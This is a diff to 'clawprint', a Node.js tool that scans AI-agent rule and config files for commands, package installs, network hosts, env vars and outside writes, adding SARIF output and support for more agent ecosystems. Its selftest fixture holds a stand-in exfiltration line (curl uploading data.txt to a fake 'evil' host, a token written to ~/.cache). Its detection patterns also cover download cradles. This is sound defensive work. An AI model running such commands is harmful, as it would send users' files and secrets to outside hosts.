@@ -18,6 +18,7 @@
  *   npx clawprint diff             alias of check
  *   npx clawprint --dir <path>     scan a different root (works with all modes)
  *   npx clawprint --json           print the JSON report to stdout, write nothing
+ *   npx clawprint --sarif          print a SARIF 2.1.0 report to stdout, write nothing
  *   npx clawprint --selftest       run bundled fixture tests, exit 0/1
  *
  * https://github.com/vanara-agents/clawprint
@@ -28,7 +29,7 @@ import { join, resolve } from 'node:path';
 import { createHash } from 'node:crypto';
 import { fileURLToPath } from 'node:url';
 
-export const VERSION = '0.1.0';
+export const VERSION = '0.2.0';
 export const MANIFEST_MD = 'CLAWPRINT.md';
 export const MANIFEST_JSON = '.clawprint.json';
 
@@ -118,6 +119,19 @@ const extOf = (relPath) => {
   return m ? m[1].toLowerCase() : '';
 };
 
+// Rule files from other agent ecosystems are markdown in disguise.
+const MD_EXTS = new Set(['md', 'markdown', 'mdc']);
+const MD_LIKE_BASENAMES = new Set(['.cursorrules', '.windsurfrules', '.clinerules']);
+const JS_EXTS = new Set(['mjs', 'js', 'cjs', 'ts', 'mts', 'cts', 'jsx', 'tsx']);
+const JS_FENCE_LANGS = new Set(['js', 'javascript', 'ts', 'typescript', 'mjs', 'cjs', 'node', 'jsx', 'tsx']);
+const PY_FENCE_LANGS = new Set(['python', 'py', 'python3']);
+
+const isMdLike = (relPath) => {
+  if (MD_EXTS.has(extOf(relPath))) return true;
+  const base = toPosix(relPath).split('/').pop();
+  return MD_LIKE_BASENAMES.has(base);
+};
+
 /** Extract fenced code blocks from markdown: [{lang, text, startLine}]. */
 export function extractFences(text) {
   const fences = [];
@@ -163,22 +177,30 @@ function collectJsonStrings(node, out = []) {
 /**
  * Build the extraction context for one file.
  * shellUnits: [{text, startLine, flavor: 'sh'|'ps'}] — regions treated as shell.
+ * jsUnits/pyUnits: [{text, startLine}] — regions given to the JS/Python
+ * regexes (whole script files AND language-tagged fences inside markdown).
  */
 export function buildContext(text, relPath) {
   const ext = extOf(relPath);
-  const ctx = { ext, shellUnits: [], fences: [], json: null, jsonCommandLines: [] };
+  const ctx = { ext, md: isMdLike(relPath), shellUnits: [], jsUnits: [], pyUnits: [], fences: [], json: null };
 
-  if (ext === 'md' || ext === 'markdown') {
+  if (ctx.md) {
     ctx.fences = extractFences(text);
     for (const f of ctx.fences) {
       if (SHELL_FENCE_LANGS.has(f.lang)) ctx.shellUnits.push({ text: f.text, startLine: f.startLine, flavor: 'sh' });
       else if (PS_FENCE_LANGS.has(f.lang)) ctx.shellUnits.push({ text: f.text, startLine: f.startLine, flavor: 'ps' });
+      else if (JS_FENCE_LANGS.has(f.lang)) ctx.jsUnits.push({ text: f.text, startLine: f.startLine });
+      else if (PY_FENCE_LANGS.has(f.lang)) ctx.pyUnits.push({ text: f.text, startLine: f.startLine });
       else if (looksLikeShell(f.text)) ctx.shellUnits.push({ text: f.text, startLine: f.startLine, flavor: 'sh' });
     }
   } else if (ext === 'sh' || ext === 'bash' || ext === 'zsh') {
     ctx.shellUnits.push({ text, startLine: 1, flavor: 'sh' });
   } else if (ext === 'ps1' || ext === 'psm1') {
     ctx.shellUnits.push({ text, startLine: 1, flavor: 'ps' });
+  } else if (JS_EXTS.has(ext)) {
+    ctx.jsUnits.push({ text, startLine: 1 });
+  } else if (ext === 'py') {
+    ctx.pyUnits.push({ text, startLine: 1 });
   } else if (ext === 'json') {
     try {
       ctx.json = JSON.parse(text);
@@ -221,6 +243,10 @@ const SHELL_KEYWORDS = new Set([
 
 const WRAPPER_COMMANDS = new Set(['sudo', 'nohup', 'env', 'command', 'exec', 'xargs']);
 const RUNNER_COMMANDS = new Set(['npx', 'bunx', 'pnpx', 'uvx', 'pipx']);
+
+// Leading interactive-prompt noise stripped before tokenizing a shell line:
+// `$ `, `> `, `PS> `, and the fully-qualified `PS C:\path> `.
+const PROMPT_PREFIX = /^\s*(\$|>|PS>|PS [A-Za-z]:[^>]*>)\s+/;
 
 const WRITE_TARGET_PREFIX = /^(~|\/|[A-Za-z]:[\\/]|%[A-Za-z_][A-Za-z0-9_]*%|\$HOME\b|\$\{HOME\}|\$env:[A-Za-z_])/;
 const WRITE_TARGET_IGNORE = new Set(['/dev/null', '/dev/stdout', '/dev/stderr', '/dev/tty', 'NUL', 'nul']);
@@ -308,20 +334,29 @@ function splitWords(segment) {
   return words;
 }
 
+// Strip leading grouping/call punctuation a program name can't start with:
+// PowerShell subexpressions `(New-Object ...)`, call operator `& cmd`, blocks.
+const stripLeadingPunct = (tok) => tok.replace(/^[(){}&.]+/, '');
+
 /** First meaningful command token of a shell segment, unwrapping sudo/env/npx etc. */
 function commandTokens(segment) {
   const tokens = splitWords(segment);
   const found = [];
   let i = 0;
-  // skip leading VAR=value assignments
-  while (i < tokens.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) i++;
+  // skip leading assignments: sh VAR=value, and PowerShell $var = value
   while (i < tokens.length) {
-    let tok = stripQuotes(tokens[i]);
-    if (tok === '' || tok.startsWith('-') || tok.startsWith('$') || tok.startsWith('#')
+    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(tokens[i])) { i++; continue; }
+    if (tokens[i].startsWith('$') && tokens[i + 1] === '=') { i += 2; continue; }
+    break;
+  }
+  while (i < tokens.length) {
+    let tok = stripLeadingPunct(stripQuotes(tokens[i]));
+    // skip empties, flags, variables, comments, keywords, operators, assignments
+    if (tok === '' || tok === '=' || tok.startsWith('-') || tok.startsWith('$') || tok.startsWith('#')
       || SHELL_KEYWORDS.has(tok) || /^[A-Za-z_][A-Za-z0-9_]*=/.test(tok)) {
+      const wasComment = tok.startsWith('#');
       i++;
-      if (tok.startsWith('#')) break;
-      if (SHELL_KEYWORDS.has(tok) || /=/.test(tok) || tok.startsWith('-')) continue;
+      if (wasComment) break;
       continue;
     }
     const base = toPosix(tok).split('/').pop();
@@ -344,12 +379,64 @@ function commandTokens(segment) {
   return found;
 }
 
+// Package-manager install invocations: [manager, ...verb] prefixes matched
+// against a tokenized shell segment. Longest prefix wins.
+const INSTALL_PATTERNS = [
+  ['pip', 'install'], ['pip3', 'install'], ['pipx', 'install'],
+  ['uv', 'add'], ['uv', 'pip', 'install'], ['uv', 'tool', 'install'],
+  ['npm', 'install'], ['npm', 'i'], ['npm', 'add'],
+  ['pnpm', 'add'], ['yarn', 'add'], ['bun', 'add'],
+  ['cargo', 'add'], ['cargo', 'install'],
+  ['gem', 'install'], ['go', 'install'], ['brew', 'install'],
+  ['apt', 'install'], ['apt-get', 'install'], ['dnf', 'install'], ['yum', 'install'],
+  ['choco', 'install'], ['winget', 'install'],
+];
+
+// Flags whose NEXT token is a value, not a package (pip/npm + winget/choco).
+const INSTALL_ARG_FLAGS = new Set([
+  '-r', '--requirement', '-c', '--constraint', '-i', '--index-url', '--extra-index-url',
+  '-t', '--target', '--source', '--id', '--version', '--scope', '--location',
+]);
+
+/** 'requests[socks]==2.0' → 'requests'; '@scope/pkg@^1.2' → '@scope/pkg'; '.' → ''. */
+function cleanPackageSpec(tok) {
+  let t = stripQuotes(tok);
+  const at = t.lastIndexOf('@');
+  if (at > 0) t = t.slice(0, at); // strips @version but keeps a leading @scope
+  t = t.split(/[=<>~!\[]/)[0];
+  if (t === '.' || t === '..') return ''; // `pip install .` installs the local project, not a named package
+  return t;
+}
+
+function extractInstallPackages(words) {
+  let i = 0;
+  while (i < words.length && (WRAPPER_COMMANDS.has(words[i]) || /^[A-Za-z_][A-Za-z0-9_]*=/.test(words[i]))) i++;
+  const rest = words.slice(i);
+  let matched = null;
+  for (const pat of INSTALL_PATTERNS) {
+    if (pat.length <= rest.length && pat.every((w, j) => rest[j] === w)) {
+      if (!matched || pat.length > matched.length) matched = pat;
+    }
+  }
+  if (!matched) return [];
+  const pkgs = [];
+  let skipNext = false;
+  for (const tok of rest.slice(matched.length)) {
+    if (skipNext) { skipNext = false; continue; }
+    if (INSTALL_ARG_FLAGS.has(tok)) { skipNext = true; continue; }
+    if (tok.startsWith('-')) continue;
+    const pkg = cleanPackageSpec(tok);
+    if (pkg) pkgs.push(pkg);
+  }
+  return pkgs;
+}
+
 export const EXTRACTORS = [
   {
     id: 'tools',
-    description: 'Declared tool grants (frontmatter tools:/allowed-tools: in .md files)',
+    description: 'Declared tool grants (frontmatter tools:/allowed-tools: in markdown-like files)',
     run(text, relPath, ctx) {
-      if (ctx.ext !== 'md' && ctx.ext !== 'markdown') return [];
+      if (!ctx.md) return [];
       const findings = [];
       // YAML-lite frontmatter parse: no dependency, handles the two shapes
       // Claude Code actually uses (inline comma list / block list).
@@ -391,7 +478,7 @@ export const EXTRACTORS = [
       for (const unit of ctx.shellUnits) {
         const lines = unit.text.split('\n');
         lines.forEach((rawLine, idx) => {
-          let line = rawLine.replace(/^\s*(\$|>|PS>|PS [A-Za-z]:[^>]*>)\s+/, '').trim();
+          let line = rawLine.replace(PROMPT_PREFIX, '').trim();
           if (!line || line.startsWith('#')) return;
           for (const seg of shellSegments(line)) {
             for (const cmd of commandTokens(seg)) push(cmd, unit.startLine + idx);
@@ -399,26 +486,46 @@ export const EXTRACTORS = [
         });
       }
 
-      if (ctx.ext === 'mjs' || ctx.ext === 'js' || ctx.ext === 'cjs' || ctx.ext === 'ts') {
+      for (const unit of ctx.jsUnits) {
         const re = /\b(?:execSync|execFileSync|spawnSync|exec|execFile|spawn|fork)\s*\(\s*(['"`])([^'"`\n]+)\1/g;
         let m;
-        while ((m = re.exec(text)) !== null) {
+        while ((m = re.exec(unit.text)) !== null) {
           for (const seg of shellSegments(m[2])) {
-            for (const cmd of commandTokens(seg)) push(cmd, lineOf(text, m.index));
+            for (const cmd of commandTokens(seg)) push(cmd, unit.startLine + lineOf(unit.text, m.index) - 1);
           }
         }
       }
 
-      if (ctx.ext === 'py') {
+      for (const unit of ctx.pyUnits) {
         const re = /\b(?:os\.system|os\.popen|subprocess\.(?:run|call|check_call|check_output|Popen))\s*\(\s*\[?\s*(['"])([^'"\n]+)\1/g;
         let m;
-        while ((m = re.exec(text)) !== null) {
+        while ((m = re.exec(unit.text)) !== null) {
           for (const seg of shellSegments(m[2])) {
-            for (const cmd of commandTokens(seg)) push(cmd, lineOf(text, m.index));
+            for (const cmd of commandTokens(seg)) push(cmd, unit.startLine + lineOf(unit.text, m.index) - 1);
           }
         }
       }
 
+      return findings;
+    },
+  },
+
+  {
+    id: 'installs',
+    description: 'Packages installed at runtime (pip, npm, cargo, brew, ...)',
+    run(text, relPath, ctx) {
+      const findings = [];
+      for (const unit of ctx.shellUnits) {
+        unit.text.split('\n').forEach((rawLine, idx) => {
+          const line = rawLine.replace(PROMPT_PREFIX, '').trim();
+          if (!line || line.startsWith('#')) return;
+          for (const seg of shellSegments(line)) {
+            for (const pkg of extractInstallPackages(splitWords(seg))) {
+              findings.push({ kind: 'installs', value: pkg, file: relPath, line: unit.startLine + idx });
+            }
+          }
+        });
+      }
       return findings;
     },
   },
@@ -449,6 +556,14 @@ export const EXTRACTORS = [
         const curlRe = /\b(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr)\s+(?:-{1,2}\S+\s+)*['"]?([A-Za-z0-9][A-Za-z0-9._-]*\.[A-Za-z]{2,})(?:[/'":\s]|$)/g;
         while ((m = curlRe.exec(unit.text)) !== null) {
           push(m[1], unit.startLine + lineOf(unit.text, m.index) - 1, m[0].trim());
+        }
+        // PowerShell download cradles with schemeless targets (URL-schemed
+        // targets are already caught by the global URL regex above)
+        if (unit.flavor === 'ps') {
+          const cradleRe = /\b(?:DownloadString|DownloadFile|DownloadData|Start-BitsTransfer)\b[^\n]*?['"](?:https?:\/\/)?([A-Za-z0-9][A-Za-z0-9._-]*\.[A-Za-z]{2,})[^'"]*['"]/gi;
+          while ((m = cradleRe.exec(unit.text)) !== null) {
+            push(m[1], unit.startLine + lineOf(unit.text, m.index) - 1, m[0].trim());
+          }
         }
       }
       return findings;
@@ -484,14 +599,14 @@ export const EXTRACTORS = [
         }
       }
 
-      if (ctx.ext === 'mjs' || ctx.ext === 'js' || ctx.ext === 'cjs' || ctx.ext === 'ts') {
+      for (const unit of ctx.jsUnits) {
         const jsRe = /process\.env(?:\.([A-Za-z_][A-Za-z0-9_]*)|\[\s*['"]([A-Za-z_][A-Za-z0-9_]*)['"]\s*\])/g;
-        while ((m = jsRe.exec(text)) !== null) push(m[1] || m[2], lineOf(text, m.index));
+        while ((m = jsRe.exec(unit.text)) !== null) push(m[1] || m[2], unit.startLine + lineOf(unit.text, m.index) - 1);
       }
 
-      if (ctx.ext === 'py') {
+      for (const unit of ctx.pyUnits) {
         const pyRe = /(?:os\.environ(?:\.get)?\s*[[(]\s*|os\.getenv\s*\(\s*)['"]([A-Za-z_][A-Za-z0-9_]*)['"]/g;
-        while ((m = pyRe.exec(text)) !== null) push(m[1], lineOf(text, m.index));
+        while ((m = pyRe.exec(unit.text)) !== null) push(m[1], unit.startLine + lineOf(unit.text, m.index) - 1);
       }
 
       return findings;
@@ -534,16 +649,16 @@ export const EXTRACTORS = [
         }
       }
 
-      if (ctx.ext === 'mjs' || ctx.ext === 'js' || ctx.ext === 'cjs' || ctx.ext === 'ts') {
+      for (const unit of ctx.jsUnits) {
         const jsRe = /\b(?:writeFile|writeFileSync|appendFile|appendFileSync|createWriteStream|copyFile|copyFileSync|rename|renameSync)\s*\(\s*(['"`])([^'"`\n]+)\1/g;
-        while ((m = jsRe.exec(text)) !== null) push(m[2], lineOf(text, m.index));
+        while ((m = jsRe.exec(unit.text)) !== null) push(m[2], unit.startLine + lineOf(unit.text, m.index) - 1);
       }
 
-      if (ctx.ext === 'py') {
+      for (const unit of ctx.pyUnits) {
         const pyRe = /\bopen\s*\(\s*(['"])([^'"\n]+)\1\s*,\s*(['"])[wax]/g;
-        while ((m = pyRe.exec(text)) !== null) push(m[2], lineOf(text, m.index));
+        while ((m = pyRe.exec(unit.text)) !== null) push(m[2], unit.startLine + lineOf(unit.text, m.index) - 1);
         const shutilRe = /\bshutil\.(?:copy|copy2|copyfile|move)\s*\(\s*[^,]+,\s*(['"])([^'"\n]+)\1/g;
-        while ((m = shutilRe.exec(text)) !== null) push(m[2], lineOf(text, m.index));
+        while ((m = shutilRe.exec(unit.text)) !== null) push(m[2], unit.startLine + lineOf(unit.text, m.index) - 1);
       }
 
       return findings;
@@ -608,7 +723,7 @@ export const EXTRACTORS = [
   },
 ];
 
-export const FINDING_KINDS = ['tools', 'commands', 'network', 'env', 'paths', 'opaque'];
+export const FINDING_KINDS = ['tools', 'commands', 'installs', 'network', 'env', 'paths', 'opaque'];
 
 // ---------------------------------------------------------------------------
 // item discovery — what gets scanned under a project root
@@ -706,6 +821,41 @@ export function discoverItems(root) {
     .map((f) => join(root, f))
     .filter((p) => existsSync(p) && statSync(p).isFile());
   if (claudeMd.length) items.push({ id: 'claude-md', kind: 'claude-md', files: readAll(claudeMd) });
+
+  // --- other agent ecosystems (all optional; absent files simply produce no items) ---
+
+  const singleton = (relFiles, id, kind) => {
+    const present = relFiles.map((f) => join(root, f)).filter((p) => existsSync(p) && statSync(p).isFile());
+    if (present.length) items.push({ id, kind, files: readAll(present) });
+  };
+
+  singleton(['AGENTS.md'], 'agents-md', 'agents-md'); // Codex / the AGENTS.md convention
+  singleton(['GEMINI.md'], 'gemini-md', 'gemini-md'); // Gemini CLI
+  singleton([join('.github', 'copilot-instructions.md')], 'copilot-md', 'copilot-md');
+  singleton(['.cursorrules'], 'cursorrules', 'cursor'); // Cursor (legacy single file)
+  singleton(['.windsurfrules'], 'windsurfrules', 'windsurf');
+  singleton([join('.cursor', 'mcp.json')], 'cursor-mcp', 'mcp');
+
+  const cursorRules = join(root, '.cursor', 'rules');
+  if (existsSync(cursorRules) && statSync(cursorRules).isDirectory()) {
+    for (const file of walkFiles(cursorRules)) {
+      // strip only the canonical .mdc; keep .md/.markdown so same-basename
+      // files stay distinct ids (a shared id silently shadows one in check)
+      const name = toPosix(file.slice(cursorRules.length + 1)).replace(/\.mdc$/i, '');
+      items.push({ id: `cursor-rules/${name}`, kind: 'cursor-rule', files: readAll([file]) });
+    }
+  }
+
+  // Cline: .clinerules may be a single file or a directory of rule files
+  const clinerules = join(root, '.clinerules');
+  if (existsSync(clinerules)) {
+    if (statSync(clinerules).isFile()) {
+      items.push({ id: 'clinerules', kind: 'cline', files: readAll([clinerules]) });
+    } else {
+      const files = walkFiles(clinerules);
+      if (files.length) items.push({ id: 'clinerules', kind: 'cline', files: readAll(files) });
+    }
+  }
 
   return items;
 }
@@ -811,6 +961,7 @@ const summarize = (report) => {
   return {
     items: report.items.length,
     commands: uniq('commands'),
+    installs: uniq('installs'),
     network: uniq('network'),
     env: uniq('env'),
     paths: uniq('paths'),
@@ -825,9 +976,9 @@ export function renderMarkdown(report) {
     `<!-- generated by clawprint v${report.version} — do not hand-edit; regenerate with: npx clawprint -->`,
     '',
     '## Summary',
-    '| Items | Commands | Network hosts | Env vars | Outside writes | Opaque blocks |',
-    '|---|---|---|---|---|---|',
-    `| ${s.items} | ${s.commands} | ${s.network} | ${s.env} | ${s.paths} | ${s.opaque} |`,
+    '| Items | Commands | Installs | Network hosts | Env vars | Outside writes | Opaque blocks |',
+    '|---|---|---|---|---|---|---|',
+    `| ${s.items} | ${s.commands} | ${s.installs} | ${s.network} | ${s.env} | ${s.paths} | ${s.opaque} |`,
     '',
   ];
 
@@ -853,6 +1004,49 @@ export function renderMarkdown(report) {
     lines.push('');
   }
   return `${lines.join('\n').trimEnd()}\n`;
+}
+
+/**
+ * SARIF 2.1.0 output for GitHub code scanning and compatible dashboards.
+ * Every finding is level "note" — clawprint is descriptive, never judgmental,
+ * so nothing may rank higher. Deterministic: no timestamps, no invocation.
+ */
+export function renderSarif(report) {
+  const ruleIds = uniqSorted(report.items.flatMap((it) => it.findings.map((f) => f.kind)));
+  const descriptions = new Map(EXTRACTORS.map((e) => [e.id, e.description]));
+  const sarif = {
+    $schema: 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
+    version: '2.1.0',
+    runs: [{
+      tool: {
+        driver: {
+          name: 'clawprint',
+          version: report.version,
+          informationUri: 'https://github.com/vanara-agents/clawprint',
+          rules: ruleIds.map((kind) => ({
+            id: `clawprint/${kind}`,
+            name: kind,
+            shortDescription: { text: descriptions.get(kind) || `clawprint ${kind} finding` },
+            defaultConfiguration: { level: 'note' },
+          })),
+        },
+      },
+      results: report.items.flatMap((it) => it.findings.map((f) => ({
+        ruleId: `clawprint/${f.kind}`,
+        level: 'note',
+        message: { text: `[${it.id}] ${f.kind}: ${f.value}` },
+        locations: [{
+          physicalLocation: {
+            // %SRCROOT% = repo root; lets GitHub code scanning resolve the
+            // relative path correctly even when uploaded from a subdirectory
+            artifactLocation: { uri: f.file, uriBaseId: '%SRCROOT%' },
+            region: { startLine: f.line },
+          },
+        }],
+      }))),
+    }],
+  };
+  return `${JSON.stringify(sarif, null, 2)}\n`;
 }
 
 // ---------------------------------------------------------------------------
@@ -928,6 +1122,7 @@ const SELFTEST_ITEMS = () => [
           '---',
           '# spicy',
           '```bash',
+          'pip install selftest-pkg==1.0',
           'curl https://api.selftest-evil.test/upload -d @data.txt',
           'echo "$SELFTEST_TOKEN" > ~/.cache/selftest-drop.txt',
           '```',
@@ -969,6 +1164,7 @@ export function selftest() {
 
   ok(has('tools', 'Bash') && has('tools', 'WebFetch'), 'E1 tools: frontmatter grants detected');
   ok(has('commands', 'curl') && has('commands', 'wget'), 'E2 commands: fence + execSync detected');
+  ok(has('installs', 'selftest-pkg'), 'E8 installs: pip install detected (version spec stripped)');
   ok(has('network', 'api.selftest-evil.test') && has('network', '203.0.113.7'), 'E3 network: host + bare IP detected');
   ok(has('env', 'SELFTEST_TOKEN') && has('env', 'SELFTEST_EXFIL'), 'E4 env: shell + process.env detected');
   ok(spicy.findings.some((f) => f.kind === 'paths' && f.value.startsWith('~/')), 'E5 paths: outside write detected');
@@ -982,6 +1178,7 @@ export function selftest() {
   ok(renderJson(report) === renderJson(again), 'determinism: repeat scan identical');
   ok(renderJson(report) === renderJson(buildReport(reversed)), 'determinism: input order irrelevant');
   ok(renderMarkdown(report) === renderMarkdown(buildReport(reversed)), 'determinism: markdown identical');
+  ok(renderSarif(report) === renderSarif(again), 'determinism: SARIF identical');
 
   // check semantics on the in-memory report
   const drifted = JSON.parse(renderJson(report));
@@ -1009,6 +1206,7 @@ Usage:
   npx clawprint diff             alias of check
   npx clawprint --dir <path>     scan a different root (works with all modes)
   npx clawprint --json           print the JSON report to stdout, write nothing
+  npx clawprint --sarif          print a SARIF 2.1.0 report to stdout, write nothing
   npx clawprint --selftest       run bundled fixture tests, exit 0/1
 
 Flags:
@@ -1018,7 +1216,7 @@ Flags:
 `;
 
 function parseArgs(argv) {
-  const opts = { mode: 'scan', dir: process.cwd(), json: false, selftest: false, allowContentDrift: false, help: false, version: false };
+  const opts = { mode: 'scan', dir: process.cwd(), json: false, sarif: false, selftest: false, allowContentDrift: false, help: false, version: false };
   for (let i = 0; i < argv.length; i++) {
     const a = argv[i];
     if (a === 'check' || a === 'diff') opts.mode = 'check';
@@ -1027,6 +1225,7 @@ function parseArgs(argv) {
       if (!argv[i]) throw new Error('--dir requires a path');
       opts.dir = resolve(argv[i]);
     } else if (a === '--json') opts.json = true;
+    else if (a === '--sarif') opts.sarif = true;
     else if (a === '--selftest') opts.selftest = true;
     else if (a === '--allow-content-drift') opts.allowContentDrift = true;
     else if (a === '--help' || a === '-h') opts.help = true;
@@ -1057,6 +1256,11 @@ export function main(argv = process.argv.slice(2)) {
     for (const f of failures) process.stderr.write(`FAIL: ${f}\n`);
     process.stderr.write(`clawprint --selftest: ${failures.length} check(s) failed\n`);
     return 1;
+  }
+
+  if (opts.sarif && opts.mode === 'check') {
+    process.stderr.write('clawprint: --sarif is a scan-mode output; it is not supported with check\n');
+    return 2;
   }
 
   if (!existsSync(opts.dir)) {
@@ -1106,6 +1310,10 @@ export function main(argv = process.argv.slice(2)) {
   }
 
   // scan mode
+  if (opts.sarif) {
+    process.stdout.write(renderSarif(report));
+    return 0;
+  }
   const json = renderJson(report);
   if (opts.json) {
     process.stdout.write(json);
@@ -1120,8 +1328,8 @@ export function main(argv = process.argv.slice(2)) {
   }
   const s = summarize(report);
   process.stdout.write(`clawprint v${VERSION}: scanned ${s.items} item(s) in ${opts.dir}\n`
-    + `  commands: ${s.commands}  network hosts: ${s.network}  env vars: ${s.env}  `
-    + `outside writes: ${s.paths}  opaque blocks: ${s.opaque}\n`
+    + `  commands: ${s.commands}  installs: ${s.installs}  network hosts: ${s.network}  `
+    + `env vars: ${s.env}  outside writes: ${s.paths}  opaque blocks: ${s.opaque}\n`
     + `Wrote ${MANIFEST_MD} and ${MANIFEST_JSON} — commit both.\n`);
   return 0;
 }
